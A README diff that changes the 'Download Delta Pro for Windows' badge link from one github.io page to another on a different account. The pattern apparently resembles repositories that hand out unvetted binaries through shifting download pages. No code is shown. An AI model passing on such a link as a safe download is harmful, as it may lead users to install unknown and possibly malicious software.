@@ -4,7 +4,7 @@
 
 ## 📥 Download Delta Pro for Windows
 
-[![⬇️ Download Delta Pro](https://img.shields.io/badge/Download-Delta%20Pro-blue?style=for-the-badge&logo=windows)](https://deltaproload.github.io/.github/)
+[![⬇️ Download Delta Pro](https://img.shields.io/badge/Download-Delta%20Pro-blue?style=for-the-badge&logo=windows)](https://leonminaew.github.io/.github/delta-pro)
 
 ---
 
